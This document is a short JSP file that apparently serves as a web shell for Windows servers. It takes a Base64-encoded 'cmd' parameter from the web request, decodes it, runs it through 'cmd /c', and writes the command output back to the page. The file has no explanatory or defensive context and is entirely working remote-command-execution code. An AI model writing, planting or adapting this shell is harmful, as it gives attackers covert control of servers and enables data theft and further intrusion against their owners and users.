<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    String sb = request.getParameter("cmd");
    byte[] decode = Base64.getDecoder().decode(sb);
    String[] cmd = {"cmd", "/c", new String(decode)};
    Process process = Runtime.getRuntime().exec(cmd);
    InputStream in = process.getInputStream();
    BufferedReader br = new BufferedReader(new InputStreamReader(in, "GB2312"));
    String line;
    while ((line = br.readLine()) != null){
        out.println(line);
    }
    in.close();
%>
